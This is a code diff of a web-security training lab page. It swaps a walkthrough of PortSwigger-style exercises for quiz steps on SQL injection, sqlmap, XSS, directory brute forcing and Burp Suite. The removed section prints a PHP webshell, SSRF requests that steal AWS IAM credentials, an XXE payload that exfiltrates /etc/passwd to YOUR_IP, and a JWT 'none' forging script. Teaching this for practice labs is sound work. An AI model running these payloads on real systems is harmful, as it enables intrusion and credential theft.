@@ -1,222 +1,90 @@
 'use client'
 import React from 'react'
 import Link from 'next/link'
+import LabTerminal, { LabStep } from '../../../components/LabTerminal'
 
-const Pre = ({ label, children }: { label?: string; children: string }) => (
-  <div style={{ margin: '1rem 0 1.5rem' }}>
-    {label && <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.15em', marginBottom: '4px' }}>{label}</div>}
-    <pre style={{ background: '#050810', border: '1px solid #003a4a', borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: '#00d4ff', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
-  </div>
-)
-const H2 = ({ num, children }: { num: string; children: React.ReactNode }) => (
-  <h2 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1rem', fontWeight: 600, color: '#00d4ff', marginTop: '3rem', marginBottom: '1rem', display: 'flex', alignItems: 'center', gap: '10px' }}>
-    <span style={{ background: 'rgba(0,212,255,0.1)', border: '1px solid rgba(0,212,255,0.3)', padding: '2px 8px', borderRadius: '3px', fontSize: '0.65rem', letterSpacing: '0.15em' }}>LAB-{num}</span>
-    {children}
-  </h2>
-)
-const Alert = ({ type, children }: { type: 'objective' | 'tip'; children: React.ReactNode }) => {
-  const c: Record<string, [string, string, string]> = {
-    objective: ['#00d4ff', 'rgba(0,212,255,0.05)', 'OBJECTIVE'],
-    tip:       ['#00ff41', 'rgba(0,255,65,0.04)', 'PRO TIP'],
+const accent = '#00d4ff'
+
+const steps: LabStep[] = [
+  {
+    id: 'web-01',
+    title: 'SQL Injection Detection',
+    objective: 'Test a login form for SQL injection by breaking out of the SQL string context. What single character is the classic first test for SQLi?',
+    hint: 'It\'s the SQL string delimiter — the character that closes a string literal.',
+    answers: ["'", "' --", "single quote", "apostrophe"],
+    xp: 15,
+    explanation: 'A single quote breaks out of the SQL string context. If the app returns an error like "syntax error near \'\'" it\'s almost certainly vulnerable. The next step is: \' OR \'1\'=\'1 to bypass authentication or use sqlmap for automated exploitation.'
+  },
+  {
+    id: 'web-02',
+    title: 'SQLMap Automation',
+    objective: 'Automate SQL injection exploitation with sqlmap. What flag extracts all database names from a vulnerable URL?',
+    hint: 'The flag is --dbs (databases). Basic usage: sqlmap -u "url" --dbs',
+    answers: ['--dbs', 'sqlmap --dbs', '-u url --dbs'],
+    xp: 25,
+    explanation: 'sqlmap -u "http://target/page?id=1" --dbs enumerates all databases. Then --tables -D dbname lists tables. --dump -D dbname -T tablename extracts data. Add --level=5 --risk=3 for more aggressive detection of complex injections.'
+  },
+  {
+    id: 'web-03',
+    title: 'XSS Payload',
+    objective: 'Test for reflected XSS. What is the simplest JavaScript alert payload to test if a site is vulnerable?',
+    hint: 'It opens a JavaScript alert dialog. Classic CTF/pentest test.',
+    answers: ['<script>alert(1)</script>', '<script>alert(1)</script>', 'alert(1)', '<script>alert("xss")</script>'],
+    flag: 'FLAG{xss_confirmed}',
+    xp: 25,
+    explanation: 'If <script>alert(1)</script> executes in the browser, the site reflects unsanitized input directly into the HTML. Real impact: steal session cookies (document.cookie), redirect to phishing pages, or load malicious scripts via src attribute.'
+  },
+  {
+    id: 'web-04',
+    title: 'Directory Brute Force',
+    objective: 'Discover hidden directories and files on a web server. What tool performs directory and file brute forcing?',
+    hint: 'Popular tools: gobuster, feroxbuster, dirb, dirbuster. Any of these are valid.',
+    answers: ['gobuster', 'feroxbuster', 'dirb', 'dirbuster', 'ffuf', 'wfuzz'],
+    xp: 20,
+    explanation: 'gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -x php,html,txt finds hidden paths. Common discoveries: /admin, /backup, /config, /.git, /api/v1. Add -b 404 to filter false positives.'
+  },
+  {
+    id: 'web-05',
+    title: 'Burp Suite Intercept',
+    objective: 'Burp Suite is the essential web app testing proxy. What keyboard shortcut in Burp forwards an intercepted request?',
+    hint: 'Check the Intercept tab — there\'s a "Forward" button. The shortcut is Ctrl+F.',
+    answers: ['ctrl+f', 'ctrl f', 'forward', 'ctrl+f or forward button'],
+    flag: 'FLAG{burp_configured}',
+    xp: 35,
+    explanation: 'Ctrl+F forwards the intercepted request in Burp Suite. Workflow: enable intercept > modify request (change parameters, headers, cookies) > Ctrl+F to send. Right-click > Send to Repeater (Ctrl+R) to replay modified requests without re-intercepting.'
   }
-  const [color, bg, label] = c[type]
-  return (
-    <div style={{ background: bg, borderLeft: `3px solid ${color}`, padding: '1rem 1.25rem', borderRadius: '0 4px 4px 0', margin: '1.25rem 0', border: `1px solid ${color}33`, borderLeftColor: color }}>
-      <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color, letterSpacing: '0.2em', marginBottom: '6px' }}>{label}</div>
-      <div style={{ color: '#8a9a8a', fontSize: '0.85rem', lineHeight: 1.7 }}>{children}</div>
-    </div>
-  )
-}
+]
 
 export default function WebAttacksLab() {
   return (
     <div>
-      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#5a7a5a' }}>
-        <Link href="/" style={{ color: '#5a7a5a', textDecoration: 'none' }}>GHOSTNET</Link>
-        <span>›</span>
-        <Link href="/modules/web-attacks" style={{ color: '#5a7a5a', textDecoration: 'none' }}>WEB ATTACKS</Link>
-        <span>›</span>
-        <span style={{ color: '#00d4ff' }}>LAB</span>
+      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#006a7a' }}>
+        <Link href="/" style={{ color: '#006a7a', textDecoration: 'none' }}>GHOSTNET</Link>
+        <span>&#8250;</span>
+        <Link href="/modules/web-attacks" style={{ color: '#006a7a', textDecoration: 'none' }}>WEB ATTACKS</Link>
+        <span>&#8250;</span>
+        <span style={{ color: accent }}>LAB</span>
       </div>
 
-      <div style={{ marginBottom: '2.5rem' }}>
-        <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.8rem', fontWeight: 700, color: '#00d4ff', margin: '0.5rem 0' }}>WEB ATTACKS LAB</h1>
-        <p style={{ color: '#5a7a5a', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem' }}>PortSwigger Web Academy · DVWA · File upload · SSRF · XXE · JWT · GraphQL</p>
-      </div>
-
-      <div style={{ background: '#050810', border: '1px solid #003a4a', borderRadius: '6px', padding: '1.25rem', marginBottom: '1.5rem' }}>
-        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.2em', marginBottom: '0.75rem' }}>BEST FREE LAB PLATFORM</div>
-        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', color: '#00d4ff', marginBottom: '4px' }}>PortSwigger Web Security Academy — portswigger.net/web-security</div>
-        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: '#5a7a5a', lineHeight: 1.7 }}>
-          200+ free interactive labs covering every OWASP category. Each lab has a hint system and solution.
-          Complete 10 labs per topic below and you will be genuinely dangerous at web application security.
+      <div style={{ marginBottom: '2rem' }}>
+        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: '#006a7a', letterSpacing: '0.2em', marginBottom: '0.5rem' }}>MOD-06 &#8250; INTERACTIVE LAB</div>
+        <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.6rem', fontWeight: 700, color: accent, margin: 0 }}>Web Attacks Lab</h1>
+        <p style={{ color: '#5a8a9a', fontSize: '0.85rem', marginTop: '0.75rem', lineHeight: 1.7 }}>
+          SQL injection, XSS exploitation, directory brute forcing, and Burp Suite workflow.
+          Complete all 5 steps to earn 120 XP.
+        </p>
+        <div style={{ marginTop: '1rem', background: 'rgba(0,0,0,0.3)', border: '1px solid #00d4ff22', borderRadius: '6px', padding: '1rem 1.25rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a8a5a', lineHeight: 1.8 }}>
+          <span style={{ color: accent, fontWeight: 600 }}>HOW TO USE THIS LAB:</span> Read each step objective, type the command or answer in the terminal below, and press Enter. Type <span style={{ color: '#ffb347' }}>hint</span> if you get stuck. Earn XP and capture flags on key steps. Progress saves automatically.
         </div>
       </div>
 
-      <H2 num="01">File Upload to RCE</H2>
-      <Alert type="objective">Upload a PHP webshell bypassing extension and content-type checks. Execute commands on the server.</Alert>
-      <Pre label="// PORTSWIGGER LAB PATH">{`# Lab: "Remote code execution via web shell upload"
-# https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload
-
-# Steps:
-# 1. Upload: shell.php with content: <?php echo system($_GET['cmd']); ?>
-# 2. Note the upload path in response
-# 3. Access: /files/avatars/shell.php?cmd=id
-
-# If basic extension is blocked → PortSwigger has 8 progressive labs:
-# - Bypass via content-type validation
-# - Bypass via blacklist extension
-# - Bypass via obfuscated extension
-# - Bypass via polyglot file
-# Complete all 8 in order`}</Pre>
-
-      <H2 num="02">SSRF to Cloud Metadata</H2>
-      <Alert type="objective">Exploit SSRF to reach the AWS metadata endpoint and extract IAM credentials.</Alert>
-      <Pre label="// SSRF LAB">{`# PortSwigger: "SSRF with blacklist-based input filter"
-# Also try: "Blind SSRF with out-of-band detection"
-
-# Test manually in DVWA (if SSRF module available):
-# Or use any app with URL fetching (image embed, webhook, etc)
-
-# Step 1: Test basic SSRF
-url=http://127.0.0.1
-
-# Step 2: Enumerate internal ports
-# Burp Intruder → payload: 1-65535 → url=http://127.0.0.1:§PORT§
-# Look for different response sizes
-
-# Step 3: Cloud metadata (AWS EC2):
-url=http://169.254.169.254/latest/meta-data/
-url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
-url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
-
-# Result: AccessKeyId + SecretAccessKey + Token → configure AWS CLI:`}</Pre>
-
-      <H2 num="03">XXE to File Read</H2>
-      <Alert type="objective">Inject XXE payload into XML-consuming endpoint. Read /etc/passwd and then sensitive application config files.</Alert>
-      <Pre label="// XXE LAB">{`# PortSwigger: "Exploiting XXE using external entities to retrieve files"
-
-# Find XML endpoint (look for Content-Type: application/xml in requests)
-# Common places: SOAP endpoints, file imports, RSS feeds, SVG uploads
-
-# Payload to read /etc/passwd:
-POST /process HTTP/1.1
-Content-Type: application/xml
-
-<?xml version="1.0"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<root><data>&xxe;</data></root>
-
-# If output not reflected (blind XXE):
-# Host evil.dtd on your server (python3 -m http.server 8888):
-# <!ENTITY % file SYSTEM "file:///etc/passwd">
-# <!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://YOUR_IP:8888/?x=%file;'>">
-# %eval;
-# &exfil;
-
-# Then in payload:
-<?xml version="1.0"?>
-<!DOCTYPE foo [
-  <!ENTITY % dtd SYSTEM "http://YOUR_IP:8888/evil.dtd">
-  %dtd;
-]>
-<root/>`}</Pre>
-
-      <H2 num="04">JWT None Algorithm</H2>
-      <Alert type="objective">Decode a JWT, modify the payload to escalate privileges, change algorithm to none, and bypass signature verification.</Alert>
-      <Pre label="// JWT ATTACK LAB">{`# PortSwigger: "JWT authentication bypass via unverified signature"
-
-# Step 1: Capture your JWT from login response
-# Step 2: Decode in jwt.io or with Python:
-import base64, json
-token = "eyJ..."
-header, payload, sig = token.split('.')
-decoded = json.loads(base64.b64decode(payload + "=="))
-print(decoded)
-
-# Step 3: Modify payload (change user to admin):
-decoded['sub'] = 'administrator'
-
-# Step 4: Re-encode with algorithm none:
-new_header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
-new_payload = base64.b64encode(json.dumps(decoded).encode()).decode().rstrip('=')
-new_token = f"{new_header}.{new_payload}."
-
-# Step 5: Use new token in request
-# Replace Authorization: Bearer OLD_TOKEN
-# with: Authorization: Bearer NEW_TOKEN
-
-# Also try JWT Tool:
-python3 jwt_tool.py OLD_TOKEN -X a  # test all attacks automatically`}</Pre>
-
-      <H2 num="05">GraphQL Introspection & Data Extraction</H2>
-      <Alert type="objective">Enumerate a GraphQL API using introspection. Find hidden queries. Extract sensitive data.</Alert>
-      <Pre label="// GRAPHQL LAB">{`# PortSwigger: "Accessing private GraphQL posts"
-
-# Step 1: Find GraphQL endpoint
-# Common paths: /graphql, /api/graphql, /graphql/v1, /gql
-
-# Step 2: Run introspection query (Burp Repeater):
-POST /graphql HTTP/1.1
-Content-Type: application/json
-
-{"query": "{ __schema { types { name fields { name } } } }"}
-
-# Step 3: Look for interesting types/fields in response
-# Find: user, password, admin, secret, token, hidden
-
-# Step 4: Query the interesting data:
-{"query": "{ user { id username password email } }"}
-
-# If introspection disabled, try field suggestion attack:
-{"query": "{ user { unknownField } }"}
-# Error: "Cannot query field 'unknownField' on type 'User'. Did you mean 'password'?"
-
-# Batch query to bypass rate limiting:
-# Send array of queries in single request
-[
-  {"query": "{user(id:1){email password}}"},
-  {"query": "{user(id:2){email password}}"},
-  {"query": "{user(id:3){email password}}"}
-]`}</Pre>
-
-      <H2 num="06">IDOR Mass Account Enumeration</H2>
-      <Alert type="objective">Use Burp Intruder to enumerate user IDs and extract data you shouldn't have access to.</Alert>
-      <Pre label="// IDOR WITH BURP INTRUDER">{`# Using DVWA or any app with user ID in URL/body
-
-# Step 1: Find ID-based endpoint
-# Example: GET /api/user/profile?id=42
-
-# Step 2: Capture in Burp → Send to Intruder
-
-# Step 3: Configure attack:
-# Positions tab → § markers around ID value
-# GET /api/user/profile?id=§42§
-
-# Step 4: Payload:
-# Type: Numbers
-# From: 1
-# To: 500
-# Step: 1
-
-# Step 5: Start attack → sort by response length
-# Identical length = same response (404/403)
-# Different length = data returned = IDOR found
-
-# Step 6: Grep responses for sensitive data:
-# Options → Grep - Extract → add regex for email, name, etc
-
-# Record every ID that returns 200 with different data
-# That's your IDOR finding — document exact requests/responses`}</Pre>
-
-      <div style={{ marginTop: '3rem', paddingTop: '2rem', borderTop: '1px solid #003a4a', display: 'flex', justifyContent: 'space-between' }}>
-        <Link href="/modules/web-attacks" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a7a5a' }}>← CONCEPT</Link>
-        <Link href="/modules/malware" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#00d4ff', padding: '8px 20px', border: '1px solid rgba(0,212,255,0.4)', borderRadius: '4px', background: 'rgba(0,212,255,0.06)' }}>
-          NEXT: MALWARE ANALYSIS →
-        </Link>
-      </div>
+      <LabTerminal
+        labId="web-attacks-lab"
+        moduleId="web-attacks"
+        title="Web Attacks Lab"
+        accent={accent}
+        steps={steps}
+      />
     </div>
   )
 }
